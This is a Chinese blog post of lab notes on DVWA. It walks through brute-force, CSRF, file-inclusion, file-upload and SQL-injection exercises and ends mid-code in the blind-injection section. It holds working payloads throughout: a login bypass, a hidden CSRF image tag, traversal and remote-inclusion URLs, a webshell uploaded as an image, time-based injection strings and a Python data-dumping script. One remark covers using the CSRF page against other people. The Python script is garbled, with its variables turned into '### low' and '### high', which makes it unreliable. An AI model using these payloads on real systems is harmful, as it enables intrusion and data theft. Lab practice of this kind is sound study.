<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>dvwa做题笔记 | rhoeoeoeoeoeo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="–">
<meta property="og:type" content="article">
<meta property="og:title" content="dvwa做题笔记">
<meta property="og:url" content="http://example.com/2021/07/25/dvwa/index.html">
<meta property="og:site_name" content="rhoeoeoeoeoeo">
<meta property="og:description" content="–">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2021-07-25T12:35:05.930Z">
<meta property="article:modified_time" content="2021-07-25T13:35:20.073Z">
<meta property="article:author" content="rhoeo">
<meta property="article:tag" content="dvwa">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="rhoeoeoeoeoeo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">rhoeoeoeoeoeo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-dvwa" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/25/dvwa/" class="article-date">
  <time class="dt-published" datetime="2021-07-25T12:35:05.930Z" itemprop="datePublished">2021-07-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/challenge/">challenge</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      dvwa做题笔记
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>–</p>
<span id="more"></span>
<h2 id="brute-force"><a href="#brute-force" class="headerlink" title="brute force"></a>brute force</h2><h3 id="low-直接爆破-或者-万能密码-admin’-or-‘1’-’1"><a href="#low-直接爆破-或者-万能密码-admin’-or-‘1’-’1" class="headerlink" title="low 直接爆破 或者 万能密码 admin’ or ‘1’=’1"></a>low 直接爆破 或者 万能密码 admin’ or ‘1’=’1</h3>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where user=&#x27;admin&#x27; and password=&#x27;1&#x27;; //查询不到</span><br><span class="line">select * from users where user=&#x27;admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27; and password=&#x27;1&#x27;; //有查询</span><br></pre></td></tr></table></figure>
<h3 id="medium-源码中加入mysqli-real-escape-string-过滤转义字符"><a href="#medium-源码中加入mysqli-real-escape-string-过滤转义字符" class="headerlink" title="medium 源码中加入mysqli_real_escape_string 过滤转义字符"></a>medium 源码中加入mysqli_real_escape_string 过滤转义字符</h3><h3 id="high-首部里加了token-需要爆破-密码-token："><a href="#high-首部里加了token-需要爆破-密码-token：" class="headerlink" title="high 首部里加了token 需要爆破 密码+token："></a>high 首部里加了token 需要爆破 密码+token：</h3><pre><code>   burp intruder 
   位置一字典爆破
   递归查询Recursive grep为位置二选择递归
</code></pre>
<h2 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h2><h3 id="low-直接改，可以通过短链接隐藏url"><a href="#low-直接改，可以通过短链接隐藏url" class="headerlink" title="low 直接改，可以通过短链接隐藏url"></a>low 直接改，可以通过短链接隐藏url</h3><p> 或构造攻击页面<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=2&amp;password_conf=2&amp;Change=Change#&quot;style=&quot;display:none;&quot;/&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p> 源码中加了<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false //检验前者中是否存在后者（ip地址）</span><br></pre></td></tr></table></figure><br> 抓包在请求头中添加referer字段<br> 对于攻击别人 可以命名攻击页面时加入对方的ip地址 </p>
<h3 id="high-要获取token，借助xss漏洞"><a href="#high-要获取token，借助xss漏洞" class="headerlink" title="high 要获取token，借助xss漏洞"></a>high 要获取token，借助xss漏洞</h3><p> 或者 利用burpsuite中的CSRF Token Tracker绕过token验证插件，写入主机名，token字段，值，repeater</p>
<h2 id="file-inclusion"><a href="#file-inclusion" class="headerlink" title="file inclusion:"></a>file inclusion:</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>  没有任何筛选</p>
<ol>
<li>访问网站根目录下文件<br>?page=../../phpinfo.php</li>
<li>访问不存在文件报错 可出服务器绝对路径</li>
<li>访问服务器非网站上绝对路径下文件</li>
<li>远程文件包含（需要 allow_url_include开启）<br>?page=<a target="_blank" rel="noopener" href="http://baidu.con/">http://baidu.con</a></li>
</ol>
<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file; </span><br><span class="line">$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file ); </span><br></pre></td></tr></table></figure>
<p>  过滤远程包含http://,https://,,/替换为空格<br>  http 大小写绕 双写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page=httphttp://://127.0.0.1/phpinfo.php</span><br><span class="line">?page=....//....//phpinfo.php</span><br></pre></td></tr></table></figure>
<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; )</span><br><span class="line">//fnmatch(pattern,string,flags) 查询是否匹配</span><br></pre></td></tr></table></figure>
<p>  参数开头必须是file (用file协议:只能本地文件传输)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=file://E:/1.jpg</span><br></pre></td></tr></table></figure>

<p>impossible 源码：<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; )</span><br></pre></td></tr></table></figure></p>
<h2 id="file-upload"><a href="#file-upload" class="headerlink" title="file upload"></a>file upload</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low:"></a>low:</h3><p>   无限制</p>
<h3 id="medium："><a href="#medium：" class="headerlink" title="medium："></a>medium：</h3><p>   验证conten-type<br>   抓包修改</p>
<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p>   验证后缀和文件头<br>   抓包修改文件头 加 GIF89 （gif图像的头文件<br>   用文件包含漏洞解析。<br>   <a target="_blank" rel="noopener" href="http://127.0.0.1/DVWA-master/hackable/uploads/yjh.png">http://127.0.0.1/DVWA-master/hackable/uploads/yjh.png</a><br>   <a target="_blank" rel="noopener" href="http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=file://D:%5CphpStudy%5CPHPTutorial%5CWWW%5CDVWA-master%5Chackable%5Cuploads%5Cyjh.png">http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=file://D:\phpStudy\PHPTutorial\WWW\DVWA-master\hackable\uploads\yjh.png</a><br>   <a target="_blank" rel="noopener" href="http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=file://D:/phpStudy/PHPTutorial/WWW/DVWA-master/hackable/uploads/yjh.png">http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=file://D:/phpStudy/PHPTutorial/WWW/DVWA-master/hackable/uploads/yjh.png</a><br>   注意！蚁剑连接时需要提前预览网站获得cookie 在high级别（默认为impossible级别）<br>   （在请求信息中加 bane:cookie  value:…<br>   或者用菜刀 手动把获得的cookie 级别 放到header头</p>
<h2 id="sql-injection"><a href="#sql-injection" class="headerlink" title="sql injection"></a>sql injection</h2><h3 id="low-2"><a href="#low-2" class="headerlink" title="low:"></a>low:</h3><p>  输入’报错： use near ‘’1’’’ 为字符型注入<br>  and 1=2 无报错无返回 存在注入点<br>  order by 2 两列<br>  通过select 1,database()得到数据库<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,table_name from information_schema.tables where table_schema=database()</span><br><span class="line">select 1,column_name from information_schema.column where table_name=&#x27;users/guestbook&#x27;</span><br></pre></td></tr></table></figure><br>  不想让他列很多条：group_concat</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dvwa guestbook:comment_id comment name</span><br><span class="line">users:user_id first_name last_name,user,</span><br><span class="line">password...</span><br></pre></td></tr></table></figure>
<h3 id="medium-2"><a href="#medium-2" class="headerlink" title="medium:"></a>medium:</h3><p>  只给选择没有发挥余地 url中无显示 猜测是post传id 翻源码发现自己漏了post submit且submit=submit（直接抓包修改会好一些）<br>  1’#报错 1=1正常 1=2无返回 数字型注入，，且存在单引号转译<br>  宽字节注入：<br>  /的gbk编码为%5C<br>  在此前加%DE,%DF,%E0都可以组成双字节编译的汉字<br>  但对两个引号之间的内容有影响<br>  （Big5 和 GBK 字符集都是有的， UTF-8 和 GB2312 没有这种字符（也就不存在宽字节注入）<br>  转换为16进制绕过：<br>  如 ‘dvwa’ 转换为 0x2764767761270a</p>
<h3 id="high："><a href="#high：" class="headerlink" title="### high："></a>### high：</h3><p>  同理可得为字符型<br>  没有明显的错误提示 好像没有什么大碍 看源码知道它对id长度有限制 用#注释掉</p>
<h3 id="impossible"><a href="#impossible" class="headerlink" title="### impossible:"></a>### impossible:</h3><p>输入全数字 限制长度1 返回检验<br>pod实现代码数据分离<br>可以学习一下源码<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">   &lt;?php</span><br><span class="line">   if( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $id = $_GET[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Was a number entered?</span><br><span class="line">    if(is_numeric( $id )) &#123;</span><br><span class="line">        // Check the database</span><br><span class="line">        $data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; );</span><br><span class="line">        $data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        // Make sure only 1 result is returned</span><br><span class="line">        if( $data-&gt;rowCount() == 1 ) &#123;</span><br><span class="line">            // Get values</span><br><span class="line">            $first = $row[ &#x27;first_name&#x27; ];</span><br><span class="line">            $last  = $row[ &#x27;last_name&#x27; ];</span><br><span class="line"></span><br><span class="line">            // Feedback for end user</span><br><span class="line">            echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="sql-injection-Blind"><a href="#sql-injection-Blind" class="headerlink" title="sql injection (Blind)"></a>sql injection (Blind)</h2><h3 id="low："><a href="#low：" class="headerlink" title="low："></a>low：</h3><p>1.bool</p>
<p>  报错为：是否存在该id 基于布尔型的<br>  同理可以试出为字符型注入、字段数<br>  扒库名：试length(database()) 然后26字母一个一个试….</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(database(),n,1)=&#x27;a&#x27;~&#x27;z&#x27;或者二分：转为ascii：ascii(substr(database(),1,1))&lt;100</span><br></pre></td></tr></table></figure>
<p>  扒表名:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">length(substr((select column_name from information_schema.columns where table_schema=database() and table_name=%27users%27 limit &#x27;+str(i)+&#x27;,1),1))</span><br><span class="line">ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#x27;+str(i)+&#x27;,1),&#x27;+str(j+1)+&#x27;,1))=&#x27;+str(k)+&#x27; %23&amp;Submit=Submit%23&#x27;</span><br></pre></td></tr></table></figure>
<p>  脚本（bool):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">sess=requests.session()</span><br><span class="line">url=&#x27;http://127.0.0.1/dvwa-master/login.php&#x27;</span><br><span class="line">text=sess.get(url).text</span><br><span class="line">pattern=re.compile(r&#x27;user_token\&#x27; value=\&#x27;.*\&#x27; /&gt;&#x27;)</span><br><span class="line">token=&#x27;&#x27;.join(pattern.findall(text))</span><br><span class="line">token=token.replace(&#x27;user_token\&#x27; value=\&#x27;&#x27;,&#x27;&#x27;)</span><br><span class="line">token=token.replace(&#x27;\&#x27; /&gt;&#x27;,&#x27;&#x27;)</span><br><span class="line">data=&#123;</span><br><span class="line">    &#x27;username&#x27;:&#x27;admin&#x27;,</span><br><span class="line">    &#x27;password&#x27;:&#x27;1&#x27;,</span><br><span class="line">    &#x27;Login&#x27;:&#x27;Login&#x27;,</span><br><span class="line">    &#x27;user_token&#x27;:token</span><br><span class="line">    &#125;</span><br><span class="line">result=sess.post(&#x27;http://127.0.0.1/dvwa-master/login.php&#x27;,data)</span><br><span class="line">headers=&#123;&#x27;Cookie&#x27;:&#x27;security=### low;PHPSESSID=5gsndsj97lro4dk90u29j6dov1&#x27;&#125;</span><br><span class="line">host = &quot;http://127.0.0.1/dvwa-master/vulnerabilities/sqli_blind/?&quot;</span><br><span class="line">ans=&#x27;&#x27;</span><br><span class="line">#csrf token incorrect 原因是自动连接impossible等级 传header</span><br><span class="line"></span><br><span class="line">## def getdatabase():</span><br><span class="line">## for i in range(1,1000):</span><br><span class="line">##     ### low = 32</span><br><span class="line">##     ### high = 128</span><br><span class="line">##     mid = (### low+### high)//2</span><br><span class="line">##     while ### low&lt;### high:</span><br><span class="line">##         mid = (### low+### high)//2</span><br><span class="line">##         url = host + &quot;id=1&#x27;+and+ascii(substr(database()%2C&quot;+str(i)+&quot;%2C1))&lt;&quot;+str(mid)+&quot;+%23+&amp;Submit=Submit#&quot;</span><br><span class="line">##         res = sess.get(url,headers=headers).text</span><br><span class="line">#</span><br><span class="line">##         if &quot;User ID is MISSING from the database&quot; in res:</span><br><span class="line">##             ### low = mid+1</span><br><span class="line">##         else:</span><br><span class="line">##             ### high = mid</span><br><span class="line">##     if mid &lt;=32 or mid &gt;=127:</span><br><span class="line">##         break</span><br><span class="line">##     ans += chr(### high-1);</span><br><span class="line">##     print(&quot;database is -&gt;&quot;+ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## ## def table:</span><br><span class="line">## databasename=&#x27;dvwa&#x27;</span><br><span class="line">## for i in range(1,100):</span><br><span class="line">##     url =host + &quot;id=1&#x27;and (select count(table_name) from information_schema.tables where table_schema=&#x27;&quot;+databasename+&quot;&#x27;)=&quot;+str(i)+&quot;%23&amp;Submit=Submit#&quot;</span><br><span class="line">##     res = sess.get(url, headers=headers).text</span><br><span class="line">##     if &quot;User ID is MISSING from the database&quot; in res:</span><br><span class="line">##         continue</span><br><span class="line">##     else:</span><br><span class="line">##         table_num=i</span><br><span class="line">##         break</span><br><span class="line">## print(table_num)</span><br><span class="line">## for k in range(table_num):</span><br><span class="line">##     print( )</span><br><span class="line">##     ans=&#x27;&#x27;</span><br><span class="line">##     for i in range(1,1000):</span><br><span class="line">##         ### low = 32</span><br><span class="line">##         ### high = 128</span><br><span class="line">##         mid = (### low+### high)//2</span><br><span class="line">##         while ### low&lt;### high:</span><br><span class="line">##             mid = (### low+### high)//2</span><br><span class="line">##             url = host + &quot;id=1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+&quot;+str(k)+&quot;%2C1)%2C&quot;+str(i)+&quot;%2C1))&lt;&quot;+str(mid)+&quot;+%23+&amp;Submit=Submit#&quot;</span><br><span class="line">##             res = sess.get(url,headers=headers).text</span><br><span class="line">##             if &quot;User ID is MISSING from the database&quot; in res:</span><br><span class="line">##                 ### low = mid+1</span><br><span class="line">##             else:</span><br><span class="line">##                 ### high = mid</span><br><span class="line">##         if mid &lt;=32 or mid &gt;=127:</span><br><span class="line">##             break</span><br><span class="line">##         ans += chr(### high-1);</span><br><span class="line">##         print(&quot;table is -&gt;&quot;+ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## ## def column:</span><br><span class="line">## tablename=&#x27;guestbook&#x27;</span><br><span class="line">## for i in range(1,100):</span><br><span class="line">##     url =host + &quot;id=1&#x27;and (select count(column_name) from information_schema.columns where table_name=&#x27;&quot;+tablename+&quot;&#x27;)=&quot;+str(i)+&quot;%23&amp;Submit=Submit#&quot;</span><br><span class="line">##     res = sess.get(url, headers=headers).text</span><br><span class="line">##     if &quot;User ID is MISSING from the database&quot; in res:</span><br><span class="line">##         continue</span><br><span class="line">##     else:</span><br><span class="line">##         column_num=i</span><br><span class="line">##         break</span><br><span class="line">## print(column_num)</span><br><span class="line">## for k in range(column_num):</span><br><span class="line">##     ans=&#x27;&#x27;</span><br><span class="line">##     for i in range(1,1000):</span><br><span class="line">##         ### low = 32</span><br><span class="line">##         ### high = 128</span><br><span class="line">##         mid = (### low+### high)//2</span><br><span class="line">##         while ### low&lt;### high:</span><br><span class="line">##             mid = (### low+### high)//2</span><br><span class="line">##             url = host + &quot;id=1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D&#x27;&quot;+tablename+&quot;&#x27;+limit+&quot;+str(k)+&quot;%2C1)%2C&quot;+str(i)+&quot;%2C1))&lt;&quot;+str(mid)+&quot;+%23+&amp;Submit=Submit#&quot;</span><br><span class="line">##             res = sess.get(url,headers=headers).text</span><br><span class="line">##             if &quot;User ID is MISSING from the database&quot; in res:</span><br><span class="line">##                 ### low = mid+1</span><br><span class="line">##             else:</span><br><span class="line">##                 ### high = mid</span><br><span class="line">##         if mid &lt;=32 or mid &gt;=127:</span><br><span class="line">##             break</span><br><span class="line">##         ans += chr(### high-1)</span><br><span class="line">##     print(&quot;column is -&gt;&quot; + ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#def data</span><br><span class="line">table_name=&#x27;users&#x27;</span><br><span class="line">columnname=&#x27;User&#x27;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    url =host + &quot;id=1&#x27;and (select count(&quot;+columnname+&quot;) from &quot;+table_name+&quot;)=&quot;+str(i)+&quot;%23&amp;Submit=Submit#&quot;</span><br><span class="line">    res = sess.get(url, headers=headers).text</span><br><span class="line">    if &quot;User ID is MISSING from the database&quot; in res:</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        num=i</span><br><span class="line">        break</span><br><span class="line">print(num)</span><br><span class="line">for k in range(num):</span><br><span class="line">    ans=&#x27;&#x27;</span><br><span class="line">    for i in range(1,1000):</span><br><span class="line">        ### low = 32</span><br><span class="line">        ### high = 128</span><br><span class="line">        mid = (### low+### high)//2</span><br><span class="line">        while ### low&lt;### high:</span><br><span class="line">            mid = (### low+### high)//2</span><br><span class="line">            url = host + &quot;id=1&#x27;+and+ascii(substr((select+&quot;+columnname+&quot;+from+&quot;+table_name+&quot;+limit+&quot;+str(k)+&quot;%2C1)%2C&quot;+str(i)+&quot;%2C1))&lt;&quot;+str(mid)+&quot;+%23+&amp;Submit=Submit#&quot;</span><br><span class="line">            res = sess.get(url,headers=headers).text</span><br><span class="line">            if &quot;User ID is MISSING from the database&quot; in res:</span><br><span class="line">                ### low = mid+1</span><br><span class="line">            else:</span><br><span class="line">                ### high = mid</span><br><span class="line">        if mid &lt;=32 or mid &gt;=127:</span><br><span class="line">            break</span><br><span class="line">        ans += chr(### high-1)</span><br><span class="line">    print(&quot;data is -&gt;&quot;+ans)</span><br></pre></td></tr></table></figure>
<p>2.时间盲注：<br>存在时间延迟为正确</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(4)#</span><br><span class="line">1&#x27; and if(length(database())=4,sleep(5),1)## </span><br><span class="line">//数据库长度</span><br><span class="line">1&#x27; and if(ascii(substr(database(),1,1))=100,sleep(5),1)## </span><br><span class="line">//数据库名</span><br><span class="line">1&#x27; and if((select count(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;)=2,sleep(5),1)#</span><br><span class="line">//表的个数</span><br><span class="line">1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1))=103,sleep(5),1)#</span><br><span class="line">//表名</span><br><span class="line">1&#x27; and if((select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)=11,sleep(5),1)#</span><br><span class="line">//列的个数</span><br><span class="line">1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1))=117,sleep(5),1)#</span><br><span class="line">//字段名</span><br><span class="line">1&#x27; and if(ascii(substr((select user from users limit 0,1),1))=97,sleep(5),1) #</span><br><span class="line">//字段</span><br></pre></td></tr></table></figure>
<h3 id="medium-3"><a href="#medium-3" class="headerlink" title="medium:"></a>medium:</h3><p>源码中存在:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br></pre></td></tr></table></figure>
<p>burpsuite抓包修改</p>
<h3 id="high-2"><a href="#high-2" class="headerlink" title="high:"></a>high:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; </span><br><span class="line">//limit 1 限制输入 用#注释</span><br><span class="line"></span><br><span class="line">if( $num &gt; 0 ) &#123;</span><br><span class="line">        // Feedback for end user</span><br><span class="line">        echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Might sleep a random amount</span><br><span class="line">        if( rand( 0, 5 ) == 3 ) &#123;</span><br><span class="line">            sleep( rand( 2, 4 ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // User wasn&#x27;t found, so the page wasn&#x27;t!</span><br><span class="line">        header( $_SERVER[ 